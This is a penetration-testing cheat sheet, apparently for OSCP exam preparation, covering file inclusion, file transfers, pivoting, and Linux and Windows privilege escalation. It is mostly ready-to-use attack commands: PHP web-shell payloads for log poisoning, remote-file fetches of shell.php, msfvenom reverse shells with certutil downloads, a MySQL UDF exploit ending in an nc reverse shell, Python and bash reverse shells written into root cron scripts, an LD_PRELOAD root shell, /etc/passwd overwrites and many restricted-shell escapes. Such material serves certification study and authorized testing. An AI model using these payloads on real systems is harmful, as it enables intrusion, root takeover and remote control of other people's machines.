# OSCP Cheat Sheet by 0xpr0N3rd

**Thanks to JohnJHacking && ByteFellow for Privilege Escalation parts on this list.**

##

## Directory Traversal & LFI

### Directory Traversal

**IMPORTANT:** Find the **VULNERABLE** parameter **FIRST**.

Read sample file on **Windows**:

```
vuln.php?param=c:\windows\system32\drivers\etc\hosts
```

Read sample file on **Linux**:

```
vuln.php?param=/etc/hosts
```

## 

### Local File Inclusion

**First**, Locate the **VULNERABLE** parameter.

**Second**, try to do **Log Poisoning**:

```
User-Agent: <?php system($HTTP_GET_VARS[cmd]) ?><?php die ?>

or 

User-Agent: <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

**NOTE:** This injection is also possible if there's FTP installed on the box.

**Third**, look again to the log files:

**Windows:**

```
vuln.php?param=c:\xampp\apache\logs\access.log
```

**Linux:**

```
vuln.php?param=/var/log/apache2/access.log
```

**Fourth**, perform LFI:

**Windows:**

```
vuln.php?param=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

**Linux:**

```
vuln.php?param=/var/log/apache2/access.log&cmd=whoami
```

### IF POSSIBLE, TRY TO HIT AN RFI

Perform Log Poisoning first.

Then:

```
User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://<LHOST>/shell.php'))?>
```

### ANOTHER METHOD, PHP FILE WRAPPERS

```
vuln.php?param=data:text/plain, hello world
```

**Injection:**

```
vuln.php?param=data:text/plain, <?php echo shell_exec("cmd") ?>
```

### IMPORTANT NOTE

If we are not able to read some ``.php`` files with either Directory Traversal or LFI, it may be happening because ``http://wrapper`` is disabled in the server configuration by setting ``allow_url_include`` to ``0``.

What we can try is:

```
vuln.php?param=ftp://<FILE_NAME>

or

vuln.php?param=expect://<COMMAND>
```

OR

```
vuln.php?param=php://filter/convert.base64-encode/resource=<FILE_NAME>
```

### PHP Info LFI

[See](https://github.com/0xpr0N3rd/OSCP-Prep/blob/main/HTB-Boxes/Linux-Boxes/2%20-%20Poison%20(Medium).md)

-------------------------------------------------------------

## File Transfers

### Method 1 (SMB Server) | Windows -> Linux

On **LOCAL**, first set up the ``/etc/samba/smb.conf`` file as follows (add on bottom of the page):

```
[SHARE_NAME]
   comment = File Drop
   path = <PATH_TO_SOURCE_DIR>
   browseable = yes
   read only = no
   guest ok = yes
```

Second, again on **LOCAL**, set up the server:

```
# smbserver.py <SHARE_NAME> $(pwd) -port <LPORT>          <- Port is optional

or

# impacket-smbserver <SHARE_NAME> $(pwd) -port <LPORT>    <- Port is optional
```

On **TARGET**:

```
PS C:\> copy <FILE_NAME> \\<LHOST>\<SHARE_NAME>\<OUTPUT_FILE_NAME>
```

## 

### Method 2 (Web ROOT) | Windows -> Linux

If you have the permission for copying the file to the webroot, copy the file to the server & download the file on **LOCAL**.

##

### Method 3 (FTP, works almost EVERYTIME) | Windows -> Linux

On **LOCAL**:

```
# pip install pyftpdlib

# python -m pyftpdlib -p 21 -w         <- "-w" flag enables anonymous write permission
```

On **TARGET**:

```
PS C:\> C:\Windows\System32\ftp.exe
ftp> open <LHOST>
ftp> user anonymous
ftp> password <BLANK>
ftp> put <FILE_NAME>
```

##

### Method 4 (SMB Server) | Linux -> Windows

On **LOCAL**, first set up the ``/etc/samba/smb.conf`` file as follows (add on bottom of the page):

```
[SHARE_NAME]
   comment = File Drop
   path = <PATH_TO_SOURCE_DIR>
   browseable = yes
   read only = no
   guest ok = yes
```

Second, on **LOCAL**:

```
# smbserver.py <SHARE_NAME> . -smb2support               <- if gives error, try installing impacket again: pip3 install . (in impacket folder)

or

# impacket-smbserver <SHARE_NAME> $(pwd) -smb2support -user <USENAME> -password <PASSWORD>      <- username, password & smb2support flags are optional
```

On **TARGET**:

```
PS C:\> $pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential('test', $pass)
PS C:\> New-PSDrive -Name "<SHARE_NAME>" -PSProvider "FileSystem" -Root "\\<LHOST>\<SHARE_NAME>" -Credential $cred


PS C:\> net use \\<LHOST>\<SHARE_NAME>
PS C:\> net use copy \\<LHOST>\<SHARE_NAME>\<FILE_NAME>
```

##

### Method 5 (Standard IEX) | Linux -> Windows

On **LOCAL**:

```
# python -m SimpleHTTPServer <LPORT>

or

# python3 -m http.server <LPORT>
```

On **TARGET**:

```
PS C:\> IEX(New-Object Net.WebClient).downloadString('http://<LHOST>:<LPORT>/<FILE_NAME>')
PS C:\> Get-ChildItem -Path C:\ -Include <FILE_NAME> -Recurse        <- Find downloaded file (recursively)
```

##

### Method 6 (Powershell) | Linux -> Windows

On **LOCAL**:

```
# python -m SimpleHTTPServer <LPORT>

or

# python3 -m http.server <LPORT>
```

On **TARGET**:

```
PS C:> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<LHOST>:<LPORT>/<FILE_NAME>', 'C:\Users\Public\Downloads\<FILE_NAME>')"
```

##

### Method 7 (Browser) | Linux -> Windows

If there's a RDP or VNC connection, use browser on navigating the files.

##

### Method 8 (Standard wget) | Linux -> Linux

On **LOCAL**:

```
# python -m SimpleHTTPServer <LPORT>

or

# python3 -m http.server <LPORT>
```

On **TARGET**:

```
# wget http://<LHOST>:<LPORT>/<FILE_NAME>
```

##

### Method 9 (SCP) | Linux -> Linux

On **LOCAL**:

```
# scp <FILE_NAME> <USERNAME>@<RHOST>:/<REMOTE_DIR>
```

##

### Method 10 (Socat) | Linux -> Linux

On **LOCAL**:

```
# socat TCP4-LISTEN:<LPORT>,fork file:<FILE_NAME>
```

On **TARGET**:

```
# socat TCP4:<LHOST>:<LPORT> file:<FILE_NAME>, create
```

##

### Method 11 (CertUtil) | Linux -> Windows

***Direct reverse shell:***

On **LOCAL**:

```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILENAME>.exe
``` 

On **TARGET** ***e.g. Sonatype Nexus***:

```
URL='http://<RHOST>:8081'
CMD='cmd.exe /c certutil -urlcache -split -f http://<LHOST>/<FILENAME>.exe <FILENAME>.exe'
USERNAME='<USERNAME>'
PASSWORD='<PASSWORD>'
```

***Don't forget to modify the exploit again.***

-------------------------------------------------------------

### File Servers

**Python 2.x:**

```
# python -m SimpleHTTPServer <LPORT>
```

**Python 3.x:**

```
# python3 -m http.server <LPORT>
```

**PHP:**

```
# php -S 0.0.0.0:<LPORT>
```

**Ruby:**

```
# ruby -run -e httpd . -p <LPORT>
```

**Busybox:**

```
# busybox httpd -f -p <LPORT>
```

-------------------------------------------------------------

## NFS

**Scan for NFS NSE scripts:**

```
# nmap -p 111 -sV -sC -vv --script nfs* <RHOST>

or

# nmap -p 111 -sV -sC -vv --script=rpcinfo <RHOST>
```

**Mount a share:**

```
# mkdir <RSHARE>
# mount -o nolock <RHOST>:/<RSHARE> <PATH_TO_RSHARE_ON_LOCAL>
```

**Unmount a share:**

```
# umount <RHOST>:/<RSHARE> <PATH_TO_RSHARE_ON_LOCAL>

or

# umount -f -l <PATH_TO_RSHARE_ON_LOCAL>
```

-------------------------------------------------------------

## Port Forwarding 

### Port Forwarding w/SSH & ProxyChains | UNIX

**First**, on **LOCAL** set up ``/etc/proxychains.conf`` file:

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 <LISTEN_PORT>
```

**Second**, on **LOCAL**, do the **Dynamic** port forwarding. This forwards all target ports through the tunnel to our local:

```
# ssh -f -N -D 127.0.0.1:<LISTEN_PORT> <USERNAME>@<RHOST>
```

**Third**, for instance, to perform **NMAP** through the tunnel, do:

```
# proxychains -q nmap -sV -Pn --top-ports 20 -sC -sT -vv <RHOST>        <- Remember "-sT" flag is a must since nmap can only scan TCP ports through proxychains 
```

**NOTE:**

- If **NMAP** scan would take too long, just do:

```
# nc -nvv -w 1 -z <RHOST> <PORT_RANGE>
```

from the **PIVOTED** box to perform a netcat port scan.

**NOTE 2:**

- If both ``proxychains`` and ``nc`` would take too long, try to upload **[nmap static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)** to the **PIVOT** box and run **nmap**.

**Fourth**, to perform **GOBUSTER** scan, do:

```
# gobuster dir -p socks5://127.0.0.1:<LISTEN_PORT> -u http://<RHOST>:<RPORT>/ -w <WORDLIST> -x <EXTENSIONS> -t 200
```

**Fifth**, to perform **WFUZZ**, do:

```
# wfuzz -p 127.0.0.1:<LISTENPORT>:SOCKS5 -c -w <WORDLIST> --hc 404 http://<RHOST>:<RPORT>/FUZZ   <- If there's an error, use SOCKS4 (configure SOCKS4 also)
```

**Sixth**, to redirect tunneled traffic on the **BROWSER**, do:

1. Open **FoxyProxy** settings
2. Select **Proxy Type** as ``SOCKS4`` or ``SOCKS5``
3. Select **Proxy IP address** as ``127.0.0.1``
4. Select **Port** as ``<LISTEN_PORT>``

##

### Port Forwarding w/PLINK.exe | Windows

***Upload*** ``plink.exe`` ***to the box. Preferably, under*** ``C:\Public\Downloads\`` ***location.***

**SOCKS-based Dynamic Port Forwarding**

```
C:\> plink.exe -N -D 127.0.0.1:<LHOST> -P <SSH PORT> <RHOST>
```

**Forward local host to remote address:**

```
C:\> plink.exe -ssh -l <REMOTE_SSH_USERNAME> -pw <PASSWORD> <RHOST>:<RPORT>:127.0.0.1:<LPORT> <RHOST>
```

**Forward local when a dedicated SOCKS proxy server is available:**

```
C:\> plink.exe -N -L <LHOST>:<SOCKS_IP>:<SOCKS_PORT>
```

**Remote Port Forwarding:**

```
C:\> plink.exe -N -R <LPORT>:127.0.0.1:<RPORT> -P 22 <RHOST>
```

**Nmap:**

```
# nmap -sS -sV 127.0.0.1 -p <PORT>
```

##

### Port Forwarding w/NETSH.exe | Windows

**Establish connection:**

```
C:\> netsh interface portproxy add v4tov4 listenport=<LHOST> listenaddress=<LPORT> connectport=<RPORT> connectaddress=<RHOST>
```

**Check routing table *(from CMD, not PS)*:**

```
C:\> netstat -anp TCP | find <LPORT>
```

**Add firewall:**

```
C:\> netsh advfirewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<RHOST> localport=<RPORT> action=allow
```

##

### Port Forwarding w/Metasploit

```
meterpreter> portfwd add –l <LPORT> –p <RPORT> –r <RHOST>

meterpreter> portfwd delete –l <LPORT> –p <RPORT> –r <RHOST>

```

##

### Double Pivoting w/SSH

Consider you want to pivot from **"Network A"** to **"Network B"**. Then, from **"Network B"**, you want to pivot to **"Network C"**

**TL;DR -> Pivot from A to B and B to C.** 

First, set up an **SSH Local Port Forwarding** from the second pivot point ***(Network B)*** to the first pivot point ***(Network A)***:

```
# ssh -f -N -L <BIND_PORT>:<RHOST_OF_C>:<RPORT_TO_FORWARD_FROM_C> <USER_OF_B>@<RHOST_OF_B>
```

Then, after establishing a connection from **Network C**, simply create an SSH tunnel from **Network B** to **Network A** by **SSH Dynamic Port Forwarding**:

```
# ssh -f -N -p <BIND_PORT> -D <NEW_BIND_PORT> <USER_OF_C>@127.0.0.1
```

**Note:** Don't forget to add new entry to your ``/etc/proxychains.conf`` file for new bind port.

##

### SSH Connection Problems

If you've been asked a ``diffie-hellman-key`` while trying to establish a connection, use following flag:

```
# ssh <USER>@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

If somehow you need to use a **DSS** private key instead of a **RSA** private key, use following flag:

```
# chmod 600 <DSS_PVT_KEY_FILE>
# ssh <USER>@<RHOST> -oPubkeyAcceptedKeyTypes=ssh-dss
```

``Unable to negotiate with x.x.x.x port 22: no matching key exchange method found.`` Error:

```
# ssh <USER>@<RHOST> <USE_DIFFIE_IF_APPLICABLE> -c 3des-cbc
```

-------------------------------------------------------------

## Privilege Escalation | Linux

**SUDO & SUID tricks:**

If possible always check sudo rights first:

```
# sudo -l
```

Execute allowed sudo binary for a user other than ``root`` user:

```
# sudo -u <USERNAME> <BINARY>
```

Sudo ``LD_PRELOAD`` Privilege Escalation:

```
# sudo -l 
```

If somehow ``env_keep+=LD+PRELOAD`` is in the output, simply create a ``C`` file with following content ``shell.c``:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

Then, hit:

```
# gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Run the exploit:

```
# sudo LD_PRELOAD=/home/<USER>/shell.so apache2
```

Check SUID allowed binaries:

```
# find / -perm -u=s -type f 2>/dev/null

or 

# find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

If ``/bin/bash`` binary has SUID bit set and if you can find a private SSH key, you can login with it:

```
# ssh -i id_rsa <USER>@<RHOST> bash -p
```

``tar`` SUID:

```
# sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Don't forget to take a look on SUID bit set ``nmap`` binary:

```
# nmap --interactive
# !sh
```

``systemctl`` SUID:

```
# TF=$(mktemp).service
# echo '[Service]
# Type=oneshot
# ExecStart=/bin/sh -c "id > /tmp/output"
# [Install]
# WantedBy=multi-user.target' > $TF
# systemctl link $TF
# systemctl enable --now $TF
```

``cp`` SUID:

```
# openssl passwd -1 -salt <NEW_USER> <PASS>             <- Attack Box
# cp /etc/passwd /outputfile                            <- Attack Box
# python -m SimpleHTTPServer <LPORT>                    <- Attack Box
# cd /tmp && wget http://<LHOST>:<LPORT>/passwd         <- Target Box
# cp passwd /etc/passwd                                 <- Target Box
# su <NEW_USER>                                         <- Target Box
```
##

**Bash tricks:**

Find files containing specific string:

```
# find / 2>>/dev/null | grep -i "<STRING>"
```

Find all files belonging to a specific user:

```
# find / -user <USER> -type f 2>>/dev/null
```

Find writable files in ``root`` directories:

```
# find / -writable -type f 2>/dev/null
# find /etc -maxdepth 1 -writable -type f
```

Find all readable files:

```
# find /etc -maxdepth 1 -readable -type f
```

Always check ``history`` and ``.bash_history``:

```
# history

# cat /home/user/.bash_history
```

``No tty present`` fix:

```
# python -c 'import pty;pty.spawn("/bin/bash")'

or

# python3 -c 'import pty;pty.spawn("/bin/bash")'

or

# <CTRL+Z>
# stty raw -echo;fg
# <ENTER> <ENTER>
```

Execution Flow Hijacking:

Get current environment variables:

```
# print $PATH
```

Hijack:

```
# export PATH=<PATH_TO_YOUR_BINARY>:$PATH
```

Writable ``/etc/passwd`` file:

```
# openssl passwd -1 -salt <USERNAME> <PASSWORD>                                        <- Attack Box
# echo "<UESRNAME>:$1$<USERNAME>........../:0:0:/root/root:/bin/bash" >> /etc/passwd   <- Target Box (be aware of escape characters, bc echo might delete some chars)
```


Check out possible kernel exploits:

```
# uname -r 

# uname -a

# hostname
```

Check backup files. Possible directories:

```
/root
/home
/tmp
/var
/var/backups
/opt
/opt/backups
/usr
```

Check exploits for running services:

```
# ps aux | grep <USER>
# ps aux | grep root
```
##

**MySQL Exploitation *(4.x/5.0)***

Always check MySQL version *(if applicable)* for **RAPTOR** exploit:

**IMPORTANT NOTE:** IF RAPTOR WON'T WORK E.G. ``file too short``, go for [this](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql)

```
# mysql -V
```

**Compiling & preparing the exploit *(raptor_udf2.c)***

Compile:

```
# gcc -g -c raptor_udf2.c
# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Transfer & Prepare:

```
# cd /tmp && wget http://<LHOST>:<LPORT>/raptor_udf2.so
# wget http://<LHOST>:<LPORT>/raptor_udf2.o
# mysql -u root -p
# <PASSWORD>

mysql > use mysql;
mysql > SHOW VARIABLES LIKE 'datadir';             <- Locate where the plugin files are (we need it to create exploitation function)
mysql > SHOW VARIABLES LIKE '%plugin%';            <- Plugin location
Server version: 5.7.30 MySQL Community Server (GPL)

mysql > CREATE TABLE potato(line blob);
mysql > INSERT INTO potato VALUES(load_file('/tmp/raptor_udf2.so'));
mysql > SELECT * FROM potato into dumpfile '/path_to_plugins_directory/raptor_udf2.so';
mysql > CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';    <- If you get an error (errno: 11) at this point, that means you need to repeat the previous step with different MySQL location, e.g. /usr/lib/mysql/raptor_udf2.so or /usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so (Also, if gcc is installed, try to look for gcc solution)
mysql > SELECT * FROM mysql.func;                  <- sanity check
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
mysql > select do_system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f');
```

##

**Cronjob tricks:**

Always check CRONJOBS:

```
# /etc/cron*
# /etc/init.d
# /etc/crontab                <- System wide cron job
# /etc/cron.allow
# /etc/cron.d
# /etc/cron.daily
# /etc/cron.hourly
# /etc/cron.monthly
# /etc/cron.weekly
# /var/spool/cron             <- User crontabs
# /var/spool/cron/crontabs    <- User crontabs
```

If there's a writable root-owned script, ``.py``, ``.sh``, etc:

Python one-liner reverse shell:

```
# echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> <FILE>.py
```

Bash one-liner reverse shell:

```
# echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f" >> <FILE>.sh
```

##

**Restricted shell escape techniques:**

Get your restricted shell type by hitting: ``$SHELL`` or ``$0``

First, check available commands such as ``cd``, ``ls``, ``echo``, etc.
Second, check for available operators such as ``>``, ``>>``, ``<``, ``|``.
Third, check available programming languages such as ``perl``, ``ruby``, ``python``, etc.
Fourth, check whether you can run commands as root ``sudo -l``.
Fifth, check environmental variables ``run env`` or ``printenv``

##

**For** ``lshell``:

```
# echo os.system('/bin/bash')
```

```
# echo "#!/bin/bash" > shell.sh
# echo "/bin/bash" >> shell.sh
# echo'/shell.sh'
```

```
# echo "#!/bin/bash" > shell.sh
# echo "/bin/bash" >> shell.sh
# echo^Khohoho/shell.sh
```

```
# echo "$(bash 1>&2)"
```

```
# echo <CTRL+V> <CTRL+J>
# bash
```

```
# ?
cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo
# ll non-existent-dir || 'bash'
```

```
# echo () bash && echo
``` 

```
# echo<CTRL+V><CTRL+I>() bash && echo
```

```
# echo FREEDOM! && help () bash && help 
FREEDOM!
```

##

**For** ``rbash``:

**Common Exploitation Techniques:**

If ``/`` is allowed, you can run ``/bin/sh`` or ``/bin/bash``

If ``cp`` is allowed, you can copy ``/bin/sh`` or ``/bin/bash`` to your own directory.

From ``ftp``, ``gdb``, ``more``, ``man``, or ``less``:

```
xxx > !/bin/sh

or

xxx > !/bin/bash
```

From ``rvim``:

```
:python import os; os.system("/bin/bash")
```

From ``scp``:

```
# scp -S /path/yourscript x y:
```

From ``awk``:

```
# awk 'BEGIN {system("/bin/sh")}'

or

# awk 'BEGIN {system("/bin/bash")}'
```

From ``find``:

```
# find / -name test -exec /bin/sh \;

or

# find / -name test -exec /bin/bash \;
```
##

**Programming Languages Techniques:**

From ``except``:

```
# except spawn sh
```

From ``python``:

```
# python -c 'import os;os.system("/bin/sh")'

or

# python3 -c 'import os;os.system("/bin/sh")'
```

From ``php``:

```
# php -a then exec("sh -i");
```

From ``perl``:

```
# perl -e 'exec "/bin/sh";'
```

From ``lua``:

```
# os.execute('/bin/sh')
```

From ``ruby``:

```
# exec "/bin/sh"
```

**Advanced Techniques:**

From ``ssh``:

```
# ssh <USER>@<RHOST> -t "/bin/sh"

or

# ssh <USER>@<RHOST> -t "/bin/bash"

or

# ssh <USER>@<RHOST> -t "bash --noprofile"

or

# ssh <USER>@<RHOST> -t "() { :; }; /bin/bash" 

or

# ssh -o ProxyCommand="sh -c /tmp/<FILE>.sh"127.0.0.1     <- SUID
```

From ``git``:

```
# git help status
# !/bin/bash
```

From ``pico``:

```
# pico -s "/bin/bash"
# /bin/bash <CTRL+T>
```

From ``zip``:

```
# zip /tmp/<FILE>.zip /tmp/<FILE> -T --unzip-command="sh -c /bin/bash"
```

From ``tar``:

```
# tar cf /dev/null <FILE> --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

From ``chsh`` ***(authenticated)***:

```
/bin/bash
```

From ``cp``, if we can copy files into existing ``PATH``:

```
#cp /bin/sh /current_directory; sh
```

From ``tee``:

```
# echo "<PAYLOAD>" | tee <FILE>.sh
```

From ``vim``:

```
:!/bin/ls -l .b*        <- File Listing

:set shell=/bin/sh
:shell

or

:!/bin/sh
```

``C`` set UID shell:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp) {
   setresgid(getegid(), getegid(), getegid());
   setresuid(geteuid(), geteuid(), geteuid());
   
   execve("/bin/sh", argv, envp);
   return 0;
}
```

If we can set ``PATH`` or ``SHELL`` variable:

```
# export PATH=/bin:/usr/bin:/sbin:$PATH
# export SHELL=/bin/sh
```

From ``ne`` *(nice editor)*:

Go to -> ``Prefs`` -> ``Load Prefs...``      <- Read Files

From ``lynx``:

```
# lynx --editor=/usr/bin/vim <PAYLOAD>
# export EDITOR=/usr/bin/vim
```

From ``mutt``:

Click ``!``:

```
/bin/sh
```

##

**Useful tools:**

- LinPEAS
- LinEnum
- LinPrivChecker
- LinuxExploitSuggester2
- LinusSmartEnumeration
- Pspy64
- Traitor (SUID)

-------------------------------------------------------------

## Privilege Escalation | Windows

**Binary checks:**

Always start with checking your privs, similar to ``sudo -l``

```
C:\> whoami /priv
```

Dangerous User Privileges:

``SEImpersonatePrivilege`` 

```
The main thing is that this privilege gives you permissions to act as any other user, just like sudo rights.

Don't even waste your time, go for JuicyPotato directly.
```

``SeAssignPrimaryPrivilege``

```
This assigns an Access Token to a process. Again, go with JuicyPotato.
```

``SeBackUpPrivilege``

```
Gives permission to read files, which means you can extract passwords or hashes from the registry.

Go for Pass-the-Hash Attack
```

``SeRestorePrivilege``

```
You can modify service binaries. Modify .dll and registry settings.
```

Other privileges that should be checked out:

- ``SeCreateTokenPrivilege``
- ``SeLoadDriverPrivilege``
- ``SeDebugPrivilege``

##

**Check Kernel Exploits:**

Check out system information first:

```
C:\> systeminfo

or

C:\> systeminfo | findstr /B /C:"OS Name" /C:"Os Version"

or

C:\> winver (RDP or VNC)

or

C:\> wmic os get Caption,CSDVersion /value

or

C:\> ver
```

Hopefully, if ``systeminfo`` worked, copy the output and go for ``windows-exploit-suggester.py``:

```
# python windows-exploit-suggester.py --update
# python windows-exploit-suggester.py --database ***.xls --systeminfo <SYSINFO_FILE>
```

You can find compiled exploits in here: ``https://github.com/SecWiki/windows-kernel-exploits``

OR, use ``searchsploit``

##

**Basic enumeration:**

Get patch information:

```
C:\> wmic qfe get Caption, Description, HotFixID, InstalledOn
```

Get groups and permissions:

```
C:\> whoami username /all
```

Get user list:

```
C:\> net user
```

Get information for specific user:

```
C:\> net user <USERNAME>
```

List all processes:

```
C:\> netstat -ano

or

C:\> tasklist /SVC
```

List firewall rules:

```
C:\> netsh advfirewall firewall show rule name=all
```

List all installed software and versions:

```
C:\> wmic product get name, version
```

Get scheduled task list:

```
C:\> schtasks /query /ms LIST /v
```

List vulnerable drivers:

```
C:\> driverquery.exe /fo table
```

##

**Service Exploits:**

Five services that should be checked out:

1. Insecure Service Permission
2. Unquoted Service Path
3. Insecure Registry Permission
4. Insecure Service Executable
5. DLL Hijacking

**Service Enumeration:**

On CMD:

```
C:\> tasklist /SVC
```

On PowerShell:

```
PS C:\> Get-Service
```

On WMIC:

```
wmic service list brief
```

List all running services:

```
C:\> sc queryex type=service powershell.exe -c "Get-Service | Where-Object {$_.Status -eq "Running"}

or

C:\> sc queryex type=service state=all | find /i "SERVICE_NAME: service_name" powershell.exe -c "Get-Service | Where Object {$_.Name -like "*service_name*"}"
```

Find status of target service:

```
C:\> sc query <SERVICE_NAME>

or

PS C:\> Get-Service <SERVICE_NAME>
```

Modify service binary path:

```
C:\> sc config <SERVICE_NAME> binpath='C:\Windows\Temp\<FILE>.exe'
```

Start or Stop a service:

```
C:\> net start <SERVICE_NAME>
C:\> net stop <SERVICE_NAME>
```

##

**Exploiting Unquoted Service Path:**



-------------------------------------------------------------

## Remote File Inclusion

Identify the **VULNERABLE** parameter.

Then start a simple python web server or nc listener and do:

```
vuln.php?param=http://<LHOST>/randomfile
```

Check if there's a request popped up in web server or nc listener.

-------------------------------------------------------------

## SMB

**Nmap:**

```
# nmap -sV -sC -vv -p 139,445 <RHOST>
```

**NBTSCAN *(for NetBIOS Service, Port 139)*:**

```
# nbtscan -r <RHOST>/<SUBNET>
```

**Nmap NSE Scripts:**

```
# nmap -sV -sC -vv -p 139,445 --script smb* <RHOST>
```

**enum4linux:**

```
# enum4linux -a <RHOST>
```

**SMBClient:**

```
# smbclient -L //<RHOST>

# smbclient //<RHOST>/<SHARE>
```

In case SMBClient would throw an error line such as ``Protocol Negotiation Failed`` while trying to connect to a share, just add following flag:

```
# smbclient //<RHOST>/<SHARE> --option='client min protocol=nt1'
```

Check permissions on SMB share:

```
# smbclient -H <RHOST> 
```

Download SMB share folders recursively:

```
# smbclient -R <RHOST>/<SHARE_NAME>
```

-------------------------------------------------------------

## SNMP

**Nmap:**

```
# nmap -sU --open -p 161 <RHOST>
```

**Onesixtyone:**

```
# onesixtyone -c community -i <IP_LIST>
```

**Enumeration:**

```
# snmpwalk -c <COMMUNITY_STRING> -v <SNMP_VERSION> -t <TIMEOUT_PERIOD> <RHOST>
```

-------------------------------------------------------------

## XSS







